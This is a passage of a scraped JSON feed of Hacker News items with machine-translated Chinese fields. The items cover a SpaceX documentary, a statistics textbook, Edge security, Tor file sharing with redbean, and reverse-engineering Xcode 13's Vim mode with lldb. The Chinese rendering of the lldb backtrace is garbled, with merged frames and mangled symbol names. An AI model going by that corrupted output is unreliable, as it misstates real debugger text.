"Netflix \u516c\u5e03 Space X \u7eaa\u5f55\u7247\uff0c\u8bb2\u8ff0\u5e73\u6c11\u8fdb\u5165\u8f68\u9053\u7684\u4efb\u52a1", "title_en": "Netflix announces Space X documentary on civilian mission into orbit", "transed": 1, "url": "https://news.sky.com/story/netflix-announces-space-x-documentary-on-civilian-mission-into-orbit-12372247", "via": "", "real_tags": ["\u516c\u5e03", "announces", "\u5730\u7403"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1071330, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u968f\u7740\u51e0\u4e4e\u6240\u6709\u9886\u57df\u7684\u6570\u636e\u6536\u96c6\u89c4\u6a21\u548c\u8303\u56f4\u4e0d\u65ad\u6269\u5927\uff0c\u7edf\u8ba1\u5b66\u4e60\u5df2\u6210\u4e3a\u4efb\u4f55\u5e0c\u671b\u4e86\u89e3\u6570\u636e\u7684\u4eba\u7684\u91cd\u8981\u5de5\u5177\u5305\u3002\u7edf\u8ba1\u5b66\u4e60\u7b80\u4ecb\u63d0\u4f9b\u4e86\u5bf9\u7edf\u8ba1\u5b66\u4e60\u4e2d\u5173\u952e\u4e3b\u9898\u7684\u5e7f\u6cdb\u4e14\u8f83\u5c11\u6280\u672f\u6027\u7684\u5904\u7406\u3002\u6bcf\u7ae0\u90fd\u5305\u542b\u4e00\u4e2a R \u5b9e\u9a8c\u5ba4\u3002\u672c\u4e66\u9002\u5408\u4efb\u4f55\u5e0c\u671b\u4f7f\u7528\u73b0\u4ee3\u5de5\u5177\u8fdb\u884c\u6570\u636e\u5206\u6790\u7684\u4eba\u3002", "note_en": "As the scale and scope of data collection continue to increase across virtually all fields, statistical learning has become a critical toolkit for anyone who wishes to understand data.  An Introduction to Statistical Learning provides a broad and less technical treatment of key topics in statistical learning. Each chapter includes an R lab. This book is appropriate for anyone who wishes to use contemporary tools for data analysis.", "posttime": "2021-08-05 20:52:36", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u5b66\u4e60,statistical,\u5e0c\u671b", "title": "\u7edf\u8ba1\u5b66\u4e60\u5bfc\u8bba\uff0c\u7b2c 2 \u7248", "title_en": "Introduction to statistical learning, 2nd edition", "transed": 1, "url": "https://www.statlearning.com/", "via": "", "real_tags": ["\u5b66\u4e60", "\u5e0c\u671b"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1071329, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u4ecb\u7ecd", "note_en": "Introduction", "posttime": "2021-08-05 20:52:26", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "microsoft,edge,\u4ecb\u7ecd", "title": "Microsoft Edge \u5c1d\u8bd5\u4f7f\u7528 Super Duper \u5b89\u5168\u6a21\u5f0f", "title_en": "Microsoft Edge Experimenting with a Super Duper Secure Mode", "transed": 1, "url": "https://microsoftedge.github.io/edgevr/posts/Super-Duper-Secure-Mode/", "via": "", "real_tags": ["microsoft", "edge", "\u4ecb\u7ecd"]}, {"category": "", "categoryclass": "", "imagename": "5f77820fa3524f453e2613a1ededb895.png", "infoid": 1071328, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5b9e\u9645\u4e0a\u4fbf\u643a\u5f0f\u53ef\u6267\u884c\u6587\u4ef6\u975e\u5e38\u9177\u3002\u4e0d\u4ec5\u56e0\u4e3a\u5b83\u4eec\u662f\u76f8\u540c\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u540c\u65f6\u517c\u5bb9 6 \u79cd\u64cd\u4f5c\u7cfb\u7edf\uff0c\u4ece NetBSD \u5230 Linux \u518d\u5230 Windows\uff0c\u8fd8\u56e0\u4e3a\u5b83\u4eec\u5360\u7528\u7684\u7a7a\u95f4\u4e0d\u5230 1 \u5146\u5b57\u8282\u3002\u8fd9\u91cc\u7279\u522b\u6709\u8da3\u7684\u662f redbean\uff0c\u5b83\u662f\u4e00\u4e2a\u6587\u4ef6\u670d\u52a1\u5668\uff0c\u5b83\u4e5f\u662f\u4e00\u4e2a zip \u5f52\u6863\u6587\u4ef6\u5e76\u4e14\u8fd8\u5b9e\u73b0\u4e86 Lua \u652f\u6301\u3002\u73b0\u5728\uff0c\u6211\u4e0d\u662f\u4e13\u5bb6\uff0c\u4e00\u5206\u949f\u524d\u6211\u60f3\u77e5\u9053\u5982\u4f55\u5728\u7528 zip \u6dfb\u52a0\u6587\u4ef6\u540e\u4ece redbean \u4e2d\u5220\u9664\u6587\u4ef6\uff08zip -d\uff0c\u786e\u8ba4\u624b\u518c\u9875\uff09\u3002\u4f46\u6211\u786e\u5b9e\u559c\u6b22\u5728\u4e0d\u63a5\u89e6 root \u7528\u6237\u7684\u60c5\u51b5\u4e0b\u505a\u6700\u5c11\u7684\u4e8b\u60c5\uff08\u4e5f\u8bb8\u9664\u4e86\u5b89\u88c5 tor \u5305\uff0c\u4f46\u6ca1\u6709\u4ec0\u4e48\u80fd\u963b\u6b62\u5b83\u4ece\u9884\u6784\u5efa\u7684\u5b58\u6863\u4e2d\u5de5\u4f5c\uff09\uff0c\u6211\u5c06\u5c1d\u8bd5\u901a\u8fc7\u91cd\u65b0\u5b9e\u73b0\u4e3b\u8981OnionShare \u4e2d\u7684\u529f\u80fd - \u6587\u4ef6\u5171\u4eab\u3002\u6211\u80fd\u4fdd\u8bc1\u5b89\u5168\u5417\uff1f\u4e0d\u53ef\u4ee5\u3002\u56e0\u4e3a root \u7528\u6237\u6c38\u8fdc\u4e0d\u4f1a\u88ab\u89e6\u53ca\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u5728\u4e4b\u540e\u5220\u9664\u5b83\u5417\uff1f\u786e\u5b9e\u3002\u5b8c\u6210\u540e\u67e5\u770b\u6587\u4ef6\u7684\u5b58\u50a8\u5e93\u3002\u5728\u5f00\u59cb\u4e4b\u524d\uff0c\u6211\u4e2a\u4eba\u611f\u8c22\u8d3e\u65af\u6c40\u9080\u8bf7\u6211\u201c\u4f20\u64ad\u8fd9\u4e2a\u8bcd\u201d\u3002\u4f60\u7684\u9f13\u52b1\u8ba9\u6211\u6765\u5230\u8fd9\u91cc :) \u7b2c 3 \u6b65\uff1a\u7981\u7528\u4ee5 Tor \u8eab\u4efd\u767b\u5f55\uff0c\u5e76\u4f7f\u7528 $USER \u4ee3\u66ff\u3002 \uff08\u9632\u6b62\u9700\u8981\u4ee5 OnionShare \u65b9\u5f0f\u8bbf\u95ee root \u7528\u6237\u3002\uff09 \u7b2c 4 \u6b65\uff1a\u4e3a\u9690\u85cf\u670d\u52a1\u8bbe\u7f6e\u76ee\u5f55\u3002 \uff08\u53ef\u9009\uff09\u7528\u7edd\u5bf9\u8def\u5f84\u66ff\u6362 $HOME\u3002 OnionShare \u662f\u5426\u66f4\u7b80\u5355\uff1f\u5927\u6982\u3002\u6211\u53ef\u4ee5\u4f7f\u7528 Pomf \u5b9e\u4f8b\u5417\uff1f\u5f53\u7136\u3002\u4f46\u4f3c\u4e4e\u81ea\u6211\u4e3b\u6301\u548c\u81ea\u6211\u505a\u4e8b\u6709\u4e00\u4e9b\u5176\u4ed6\u65b9\u5f0f\u65e0\u6cd5\u5b9e\u73b0\u7684\u7f8e\uff0c\u6240\u4ee5\u6211\u5728\u8fd9\u91cc:)", "note_en": "Actually Portable Executables are very cool. Not least because they are the same binary compatible with 6 Operating Systems at the same time, from NetBSD to Linux to Windows, but also because they do so while taking up less than a megabyte of space. Of particular interest here is  redbean, a file server that is also a zip archive and also implements Lua support.\n Now, I am not an expert, and a minute ago I was wondering how to remove files from redbean after adding them with zip (zip -d, confirms the manual page). But I do love doing things minimally without ever touching the root user (maybe except for installing the tor package, but nothing is preventing this from working from a  prebuilt archive), and I will try to present this as simply as possible by reimplementing the primary feature in OnionShare - file sharing.\n Can I guarantee security? No. Can you delete this trivially afterwards since the root user is never touched? Definitely. See the repository for the files after completion.\n Before starting, my personal thanks to Justine for inviting me to &#39;spread the word&#39;. Your word of encouragement has brought me here :)\n       Step 3: Disable logging in as  tor, and use  $USER instead. (Prevents the need for access to the  root user, in OnionShare fashion.)\n  Step 4: Set up directories for hidden services. Optionally replace $HOME with an absolute path.\n            Is OnionShare simpler? Probably. Could I have used a  Pomf instance? Certainly. But it seems there is some beauty in self-hosting and self-doing that cannot be attained otherwise, so here I am :)", "posttime": "2021-08-05 20:52:07", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "tor,\u6587\u4ef6", "title": "OnionShare \u4e0e Just Tor \u548c Redbean", "title_en": "OnionShare with Just Tor and Redbean", "transed": 1, "url": "https://github.com/ndren/redbean-onionshare", "via": "", "real_tags": ["tor", "\u6587\u4ef6"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1071327, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6211\u8bd5\u56fe\u5728\u6807\u9898\u4e2d\u8bf4\u6e05\u695a\uff0c\u4f46\u5e0c\u671b\u4f60\u6ca1\u6709\u8fdb\u5165\u8fd9\u4e2a\u9875\u9762\uff0c\u8ba4\u4e3a Apple \u63d0\u4f9b\u4e86\u4e00\u79cd\u5728 Xcode 13 \u7684\u65b0 Vim \u6a21\u5f0f\u4e2d\u6dfb\u52a0\u81ea\u5b9a\u4e49\u952e\u6620\u5c04\u7684\u5185\u7f6e\u65b9\u6cd5\u3002\u4e0d\u5e78\u7684\u662f\uff0c\u8fd9\u4e2a\u529f\u80fd\u5e76\u4e0d\u662f\u6613\u4e8e\u914d\u7f6e\u3002\u76f8\u53cd\uff0c\u8fd9\u662f\u5176\u4e2d\u4e00\u79cd\u201c\u4f46\u4e00\u5207\u90fd\u53ef\u4ee5\u901a\u8fc7\u8db3\u591f\u7684 swizzling \u548c\u6307\u9488\u7b97\u6cd5\u8fdb\u884c\u914d\u7f6e\u201d\u7c7b\u578b\u7684\u5e16\u5b50\u3002\u7b2c\u4e00\u4ef6\u4e8b\uff1aXcode 13 \u662f\u7b2c\u4e00\u4e2a\u63d0\u4f9b\u5185\u7f6e Vim \u6a21\u5f0f\u7684 Xcode \u7248\u672c\uff01\u8fd9\u662f\u4e2a\u5927\u65b0\u95fb\u2014\u2014\u6211\u5728\u8fc7\u53bb\u51e0\u5e74\u624d\u771f\u6b63\u8fdb\u5165 vim\uff0c\u4f46\u8fd9\u662f\u6211\u8ba4\u4e3a\u6b64\u65f6\u6211\u6c38\u8fdc\u4e0d\u4f1a\u5fd8\u8bb0\u7684\u4e8b\u60c5\u4e4b\u4e00\u3002\u7531\u4e8e\u8fd9\u4e2a\u539f\u56e0\uff0c\u6211\u662f XVim \u63d2\u4ef6\u7684\u5fe0\u5b9e\u7c89\u4e1d\uff0c\u6240\u4ee5\u770b\u5230\u76f4\u63a5\u6dfb\u52a0\u5230 Xcode \u7684 vim \u529f\u80fd\u5f88\u68d2\u3002\u8fd9\u5c24\u5176\u6b63\u786e\uff0c\u56e0\u4e3a XVim \u662f\u6211\u4ecd\u7136\u7ecf\u5e38\u4f7f\u7528\u7684\u6700\u540e\u4e00\u4e2a Xcode \u63d2\u4ef6 - Xcode \u4e2d\u7684\u6b63\u786e vim \u529f\u80fd\u53ef\u80fd\u610f\u5473\u7740\u6ca1\u6709\u62c5\u5fc3\u5c06\u6765\u7ba1\u7406\u63d2\u4ef6\u3002\u8bdd\u867d\u5982\u6b64\uff0c\u867d\u7136\u8fd9\u65e0\u8bba\u54ea\u79cd\u65b9\u5f0f\u90fd\u662f\u5411\u524d\u8fc8\u51fa\u7684\u91cd\u8981\u4e00\u6b65\uff0c\u4f46\u5b83\u5e76\u4e0d\u5b8c\u5168\u662f\u4e00\u4e2a\u5b8c\u6574\u7684\u5b9e\u73b0\uff0c\u6b63\u5982 Apple \u81ea\u5df1\u76f8\u5f53\u4f4e\u8c03\u7684\u63cf\u8ff0\u6240\u8868\u660e\u7684\u90a3\u6837\uff1a\u4ee3\u7801\u7f16\u8f91\u5668\u548c mldr \u76f4\u63a5\u652f\u6301 Vim \u7528\u6237\u719f\u6089\u7684\u8bb8\u591a\u5e38\u7528\u7ec4\u5408\u952e\u548c\u7f16\u8f91\u6a21\u5f0f\n\u5f53\u7136\uff0c\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u53d1\u73b0\u81ea\u5df1\u5728\u4f7f\u7528\u5b83\u65f6\u7f3a\u5c11\u4e00\u4e9b\u529f\u80fd - \u663e\u7136\u6211\u559c\u6b22\u4f7f\u7528 :25 \u4e4b\u7c7b\u7684\u547d\u4ee4\u8df3\u8f6c\u5230\u7279\u5b9a\u7684\u884c\u53f7 - \u4f46\u662f\u8fd9\u4e2a\u529f\u80fd\u5df2\u7ecf\u63a8\u51fa\u4e86\u8db3\u591f\u7684\u529f\u80fd\u6765\u6db5\u76d6\u6211\u5927\u90e8\u5206\u65f6\u95f4\u90fd\u60f3\u505a\u3002\u9664\u4e86\u4e00\u4ef6\u5927\u4e8b\uff0c\u5230\u76ee\u524d\u4e3a\u6b62\u6211\u4e00\u76f4\u65e0\u6cd5\u514b\u670d - \u6211\u901a\u5e38\u4f1a\u5c06\u6211\u7684\u8f6c\u4e49\u952e\u6620\u5c04\u5230\u5176\u4ed6\u4e1c\u897f\u3002\u597d\u5427\uff0c\u81f3\u5c11\u5728\u63d2\u5165\u6a21\u5f0f\u4e0b\u3002\u6211\u7684 .vimrc \u6587\u4ef6\u7684\u90a3\u90e8\u5206\u770b\u8d77\u6765\u50cf\u8fd9\u6837\uff1a &amp;mldr \u8fd9\u771f\u7684\u5f88\u68d2 - \u5b83\u6620\u5c04\u4e86\u4e00\u7cfb\u5217\u952e - j \u952e\uff0c\u7136\u540e\u662f\u5feb\u901f\u8fde\u7eed\u7684 k \u952e - \u9000\u51fa\u63d2\u5165\u6a21\u5f0f\u3002\u8fd9\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u6620\u5c04\uff0c\u800c\u4e14\u5f88\u597d\u539f\u56e0 - \u53ea\u9700\u5728\u4e3b\u884c\u5feb\u901f\u53cc\u51fb\u5373\u53ef\u5207\u6362\u6a21\u5f0f\u3002\u4f7f\u7528\u7684\u952e - \u4ee5\u53ca\u786e\u5207\u7684\u884c\u4e3a\uff0c\u5728\u90a3\u91cc\u4f60\u4f1a\u5f97\u5230\u4e00\u79cd\u201c\u5047\u201djuntil \u5b83\u57fa\u4e8e\u53e6\u4e00\u4e2a\u6309\u952e\u6216\u8d85\u65f6\u6765\u89e3\u51b3 - \u8fd9\u4f7f\u5f97\u4f7f\u7528 Xcode \u4e4b\u5916\u7684\u8f6f\u4ef6\u5b9e\u73b0\u8fd9\u4e00\u70b9\u53d8\u5f97\u56f0\u96be\u3002\u4f46\u5b83\u73b0\u5728\u4e0d\u4ec5\u662f\u6211\u808c\u8089\u8bb0\u5fc6\u7684\u6838\u5fc3\u90e8\u5206\uff08\u6211\u5f88\u60ca\u8bb6\u5728\u6ca1\u6709\u8fd9\u4e2a\u6620\u5c04\u7684\u60c5\u51b5\u4e0b\uff0c\u5b57\u7b26 jk \u4e00\u76f4\u51fa\u73b0\u5728 Xcode \u4e2d\uff09\uff0c\u800c\u4e14\u8fd8\u662f\u6211\u4e0d\u60f3\u6446\u8131\u7684\u4e1c\u897f\uff1b\u6211\u5f88\u4e45\u4ee5\u524d\u5c31\u53d1\u73b0\u8fd9\u662f\u6211\u7684\u504f\u597d\uff0c\u6211\u4e0d\u60f3\u5b66\u4e60\u5176\u4ed6\u4e1c\u897f\u53ea\u662f\u4e3a\u4e86\u5b89\u629a Xcode\u3002\u4e0e\u6b64\u7c7b\u4e8b\u60c5\u7ecf\u5e38\u53d1\u751f\u7684\u60c5\u51b5\u4e00\u6837\uff0c\u6211\u4eec\u5b9e\u9645\u4e0a\u53ea\u6709\u51e0\u4e2a\u6b65\u9aa4\u8981\u6db5\u76d6\uff1a\n\u6240\u4ee5\u8ba9\u6211\u4eec\u4ece\u7b2c\u4e00\u4e2a\u5f00\u59cb\u3002\u4f7f\u7528 Vim \u6a21\u5f0f\u65f6\uff0cXcode \u5305\u542b\u4e00\u4e2a\u65b0\u7684\u5e95\u90e8\u680f\uff0c\u5176\u4e2d\u5217\u51fa\u4e86\u4e00\u4e9b\u5f53\u524d\u53ef\u7528\u7684\u64cd\u4f5c\uff1a\u4e00\u4e2a\u4e0d\u9519\u7684\u5f00\u59cb\u9009\u62e9\u662f\u641c\u7d22\u8fd9\u4e9b\u64cd\u4f5c\u540d\u79f0\u5e76\u5c1d\u8bd5\u627e\u5230\u5b83\u4eec\u7684\u4f7f\u7528\u4f4d\u7f6e - \u8fd9\u4e0d\u662f\u4e00\u79cd\u8d85\u7cbe\u786e\u7684\u65b9\u6cd5\uff0c\u4f46\u5b83\u662f\u5feb\u901f\u4e14\u7ecf\u5e38\u6709\u6548\u3002\u540d\u4e3a SourceEditor \u7684\u6846\u67b6\u4e2d\u7684\u5355\u4e2a\u5339\u914d\u9879 - \u5982\u679c\u6709\u7684\u8bdd\uff0c\u6211\u5e0c\u671b\u672c\u5730\u5316\u6587\u4ef6\u4e2d\u7684\u5339\u914d\u9879\u5305\u542b\u201cYANK_DESCRIPTION\u201d=\u201cyank\uff08\u590d\u5236\uff09\u201d\u4e4b\u7c7b\u7684\u5185\u5bb9\uff0c\u4e4b\u540e\u6211\u4eec\u5c06\u641c\u7d22 YANK_DESCRIPTION\u3002\u4f46\u662f\uff0c\u563f\uff0c\u5bf9\u6211\u6709\u7528\uff01\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u50cf Hopper \u8fd9\u6837\u7684\u53cd\u6c47\u7f16\u7a0b\u5e8f\u4e2d\u6253\u5f00 SourceEditor\uff0c\u7136\u540e\u518d\u6b21\u641c\u7d22\u6211\u4eec\u7684\u201cyank (copy)\u201d\u5b57\u7b26\u4e32\u3002\u8fd9\u7ed9\u51fa\u7684\u7ed3\u679c\u4f3c\u4e4e\u88ab\u540d\u4e3a SourceEditor.ViYankToEndOfParagraphDownCommand.init \u7684\u51fd\u6570\u5f15\u7528\uff1a \u4ee5 Vi \u5f00\u5934\u7684\u7c7b\u540d\u597d\u6d88\u606f\uff01\u6211\u4eec\u8fd8\u6709\u66f4\u591a\u7684\u5de5\u4f5c\u8981\u505a\uff0c\u4f46 SourceEditor \u6846\u67b6\u4f3c\u4e4e\u662f\u4e00\u4e2a\u6b63\u786e\u7684\u8d77\u70b9\u3002\u4f7f\u7528\u53cd\u6c47\u7f16\u5668\u8ddf\u8e2a\u5176\u4f59\u90e8\u5206\u53ef\u80fd\u6bd4\u5b83\u7684\u4ef7\u503c\u66f4\u591a\u3002\u76f8\u53cd\uff0c\u8ba9\u6211\u4eec\u6253\u5f00 Xcode 13\uff0c\u5c06\u8c03\u8bd5\u5668\u9644\u52a0\u5230\u5b83\uff0c\u5e76\u5728\u6240\u6709 SourceEditor.ViYankToEndOfParagraphDownCommand \u65b9\u6cd5\u4e0a\u653e\u7f6e\u4e00\u4e2a\u65ad\u70b9\u3002\u8fd9\u6837\uff0c\u5982\u679c\u6211\u4eec\u5728 Vim \u6a21\u5f0f\u4e0b\u6267\u884c yank-to-end-of-paragraph\uff0c\u6211\u4eec\u5e94\u8be5\u70b9\u51fb\u6211\u4eec\u7684\u65ad\u70b9\u3002\n% lldb (lldb ) process attach --name XcodeProcess 20279 \u505c\u6b62 (lldb) b -r &quot;SourceEditor.ViYankToEndOfParagraphDownCommand&quot;\u65ad\u70b9 1\uff1a22 \u4e2a\u4f4d\u7f6e\u3002 (lldb ) continueProcess 20279 \u6062\u590d \u5728\u8fd9\u4e00\u70b9\u4e0a\uff0c\u6211\u610f\u8bc6\u5230\u6211\u4e0d\u77e5\u9053\u5982\u4f55\u731b\u62c9\u5230\u6bb5\u843d\u7684\u672b\u5c3e\u3002\u8c37\u6b4c\u8bf4 y}\uff1f\u4e0d\u8fc7\uff0c\u8fd9\u4f3c\u4e4e\u5e76\u6ca1\u6709\u8fbe\u5230\u65ad\u70b9\uff0c\u76ee\u524d\u8fd8\u4e0d\u6e05\u695a\u662f\u6211\u505a\u9519\u4e86\u4ec0\u4e48\uff0c\u8fd8\u662f\u8fd9\u4e2a\u65ad\u70b9\u6ca1\u6709\u843d\u5728\u6709\u7528\u7684\u5730\u65b9\u3002\u56de\u987e Hopper \u7684\u5176\u4ed6 SourceEditor.Vi \u524d\u7f00\u7c7b\uff0cSourceEditor.ViReplaceCharacterCommandHandler \u8df3\u51fa\u6765\u4f5c\u4e3a\u4e00\u4e2a\u5f88\u597d\u7684\u7b2c\u4e8c\u4e2a\u9009\u9879\u3002\u6211\u7edd\u5bf9\u77e5\u9053\u5982\u4f55\u66ff\u6362\u4e00\u4e2a\u5b57\u7b26\uff08\u5e94\u8be5\u662f r\uff0c\u7136\u540e\u662f\u66ff\u6362\uff09\u5e76\u4e14\u8fd9\u4e2a\u7c7b\u6709\u4e00\u4e2a CommandHandler \u540e\u7f00\u800c\u4e0d\u662f\u4e0d\u4ec5\u4ec5\u662f\u547d\u4ee4 - \u542c\u8d77\u6765\u50cf\u662f\u5728\u53d1\u751f\u66ff\u6362\u65f6\u80af\u5b9a\u5e94\u8be5\u6709\u4e00\u4e2a\u65b9\u6cd5\u8c03\u7528\u5b83\u7684\u4e1c\u897f\u3002\u76ee\u6807 0\uff1a(Xcode) \u505c\u6b62\u3002 (lldb) bt* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.6 * frame #0: 0x12adc4ec0 SourceEditor`\u534f\u8bae\u89c1\u8bc1 SourceEditor.CommandHandler.selectionMode.getter : Swift.Optional&lt;SourceEditor .SourceEditorView.SourceEditorSelectionMode&gt; \u7b26\u5408 SourceEditor.ViReplaceCharacterCommandHandler : SourceEditor.CommandHandler in SourceEditor frame #1: 0x12afb1882 SourceEditor`SourceEditor.CommandInterface.performCommandWithSelector(_: ObjectiveC.Selector, sender: Swift.Optional:&lt;Any.Optional arguments&gt; Any&gt;...) throws -&gt; () + 242 frame #2: 0x12ade19fe SourceEditor`SourceEditor.SourceEditorView.perform(_: Swift.Optional&lt;ObjectiveC.Selector&gt;, with: Swift.Optional&lt;Any&gt;) -&gt; Swift\u3002 Optional&lt;Swift.Unmanaged&lt;Swift.AnyObject&gt;&gt; + 286 frame #3: 0x12ade1b0e SourceEditor`@objc SourceEditor.SourceEditorView.perform(_: Swift.Optional&lt;ObjectiveC.Selector&gt;, with: Swift.Optional&lt;Any&gt;) -&gt; Swift.Optional&lt;Swift.Unmanaged&lt;Swift.AnyObject&gt;&gt; + 126 \u5e27 #4\uff1a0x12afc7b20 \u9178ceEditor`SourceEditor.ViCommand.perform(actions: Swift.Array&lt;ObjectiveC.Selector&gt;, context: SourceEditor.ViEventConsumer.Context) -&gt; SourceEditor.ViCommand.PerformResult + 288 frame #5: 0x12afc7c1b SourceEditor`SourceEditor.ViCommand.perform(context : SourceEditor.ViEventConsumer.Context) -&gt; SourceEditor.ViCommand.PerformResult + 43 frame #6: 0x12afeb894 SourceEditor`SourceEditor.ViEventConsumer.(\u5728_383C3123AEDAAFA7B0BF64D9906E584E\u4e2d\u6267\u884c)(command:SourceViCommand.SourceViEventEditor)SourceVib894 SourceEditor`SourceEditor.ViEventConsumer. .ViCommand.PerformResult + 52 \u5e27 #7: 0x12afebfbb SourceEditor`SourceEditor.ViEventConsumer.(handle in _383C3123AEDAAFA7B0BF64D9906E584E)(commands: Swift.Array&lt;SourceEditor.ViCommand&gt;, context: -SourceConSourceEditor.ViEventConsumer. ViCommand.PerformResult&gt; + 1211 frame #8: 0x12afec603 SourceEditor`SourceEditor.ViEventConsumer.handleKeyEvent(_: __C.NSEvent, in: SourceEditor.SourceEditorView) -&gt; Swift.Bool + 1443 frame #9: 0x 13b38fe1a IDESourceEditor`IDESourceEditor.IDEViEventConsumer.handleKeyEvent(_: __C.NSEvent, in: SourceEditor.SourceEditorView) -&gt; Swift.Bool + 938 frame #10: 0x12b0de385 SourceEditor`SourceEditor.SourceEditor:View.__C.NS() -&gt; ) + 405 \u5e27 #11: 0x12b0de47f SourceEditor`@objc SourceEditor.SourceEditorView.keyDown(with: __C.NSEvent) -&gt; () + 47 \u5e27 #12: 0x7fff22e2f908 AppKit`-[NSWindow(NSEventRouting):Eventis2Delayed48\u5e27 #13: 0x7fff22e2dd96 AppKit`-[NSWindow(NSEventRouting) sendEvent:] + 347 \u5e27 #14: 0x104f16674 IDEKit`-[IDEWorkspaceWindow sendEvent:] + 154 \u5e27 #15: +7fff22e2cc11 App 3021 \u5e27 #16: 0x104f5a189 IDEKit`-[IDEApplication sendEvent:] + 857 \u5e27 #17: 0x7fff23104f71 AppKit`-[NSApplication _handleEvent:] + 65 \u5e27 #18: 0x7fff22c9506e 4006NS App \u6846\u67b6 +8506e406NS \u5e94\u7528\u7a0b\u5e8f\u5e27 #17 DVTKit`-[DVTApplication run] + 54 \u5e27 #20: 0x7fff22c6924c AppKit`NSApplicationMain + 816 \u5e27#21: 0x7fff203c1f3d libdyld.dylib`start + 1 frame #22: 0x7fff203c1f3d libdyld.dylib`start + 1 \u4ece\u5e95\u90e8\u5f00\u59cb\uff0c\u4e00\u4e9b\u901a\u7528\u7684\u5e94\u7528\u7a0b\u5e8f/\u7a97\u53e3\u903b\u8f91\u6b63\u5728\u6162\u6162\u5192\u51fa\u4e00\u4e2a NSEvent\uff08\u4ece\u7b2c 17 \u5e27\u5230\u7b2c 12 \u5e27\uff09\u4e0a\u9762\u8fd8\u6709\u66f4\u591a\u7684 vim \u5904\u7406\uff0c\u4f46\u968f\u7740\u6211\u4eec\u7684\u8fdb\u884c\uff0c\u4e8b\u60c5\u53d8\u5f97\u66f4\u52a0\u6df7\u4e71\u3002\n\u65e2\u7136\u6211\u4eec\u5bf9 vim \u547d\u4ee4\u7684\u63a7\u5236\u6d41\u662f\u4ec0\u4e48\u6837\u5b50\u6709\u4e86\u6700\u7ec6\u5fae\u7684\u4e86\u89e3\uff0c\u5f88\u660e\u663e\uff0c\u5982\u679c\u4e0d\u4ed8\u51fa\u5f88\u591a\u52aa\u529b\uff0c\u6211\u4eec\u53ef\u80fd\u65e0\u6cd5\u7406\u89e3\u6574\u4e2a\u7cfb\u7edf\uff1a\u6709\u4e8b\u4ef6\u3001\u4e8b\u4ef6\u4f7f\u7528\u8005\u3001\u4e8b\u4ef6\u6d88\u8d39\u8005\u4e0a\u4e0b\u6587\u3001\u547d\u4ee4\u3001\u547d\u4ee4\u63a5\u53e3\u3001\u547d\u4ee4\u5904\u7406\u7a0b\u5e8f\u548cmldr\u5373\u4f7f\u6709\u6e90\u4ee3\u7801\u548c\u6587\u6863\uff0c\u6211\u4e5f\u53ef\u80fd\u65e0\u6cd5\u7406\u89e3\u5b83\u3002\u76f8\u53cd\uff0c\u8ba9\u6211\u4eec\u627e\u4e00\u4e2a\u8f83\u5c0f\u7684\u9886\u57df\u6765\u5173\u6ce8\u3002\u6211\u4eec\u4e3b\u8981\u53ea\u662f\u60f3\u544a\u8bc9 Xcode \u5b83\u5b9e\u9645\u4e0a\u6b63\u5728\u63a5\u6536\u4e0d\u540c\u7684\u8f93\u5165\u3002\u8fd9\u4e0d\u662f\u6211\u4eec\u9700\u8981\u505a\u7684\u5168\u90e8 - \u5728\u67d0\u4e9b\u65f6\u5019\uff0c\u6211\u4eec\u5c06\u4e0d\u5f97\u4e0d\u5f04\u6e05\u695a\u5982\u4f55\u505a\u4e00\u4e9b\u4e8b\u60c5\uff0c\u4f8b\u5982\u68c0\u67e5\u6211\u4eec\u5f53\u524d\u5904\u4e8e\u54ea\u79cd vim \u6a21\u5f0f - \u4f46\u6211\u4eec\u53ef\u4ee5\u5f53\u6211\u4eec\u5230\u8fbe\u65f6\u70e7\u6389\u90a3\u5ea7\u6865\u3002\u8ba9\u6211\u4eec\u4ece\u4e0a\u9762\u8c03\u7528\u7684 IDESourceEditor.IDEViEventConsumer.handleKeyEvent \u65b9\u6cd5\u5f00\u59cb\u3002\u5b83\u662f\u5806\u6808\u4e2d\u6700\u4f4e\u7684 vim \u7279\u5b9a\u6846\u67b6\uff1b\u8db3\u591f\u4f4e\u4ee5\u81f3\u4e8e\u5b83\u53ea\u771f\u6b63\u5904\u7406 NSEvent\uff0c\u56e0\u6b64\u65e0\u8bba\u5904\u7406\u5c06\u6309\u952e\u6620\u5c04\u5230\u547d\u4ee4\u7684\u903b\u8f91\u90fd\u53ef\u80fd\u53d1\u751f\u5728\u8fd9\u4e00\u70b9\u4e4b\u540e\u3002\u6211\u4eec\u53ef\u4ee5\u7981\u7528\u6211\u4eec\u539f\u6765\u7684\u65ad\u70b9\u5e76\u5728\u8fd9\u4e2a IDEViEventConsumer.handleKeyEvent \u65b9\u6cd5\u4e0a\u6dfb\u52a0\u4e00\u4e2a\u65b0\u65ad\u70b9\uff1a\u56de\u5230 Xcode\uff0c\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u70b9\u51fb\u4efb\u610f\u952e\u5230\u8fbe\u6211\u4eec\u7684\u65ad\u70b9\uff0c\u56e0\u4e3a\u6211\u4eec\u4e0d\u518d\u6253\u7834\u5b57\u7b26\u66ff\u6362\u903b\u8f91\uff1b\u6211\u4f1a\u9996\u5148\u4f7f\u7528\u9f20\u6807\u79fb\u52a8\u5230\u7b2c 1 \u884c\uff0c\u7136\u540e\u6309 j \u952e\uff0c\u8fd9\u5e94\u8be5\u5c06\u6211\u4eec\u5411\u4e0b\u79fb\u52a8\u5230\u7b2c 2 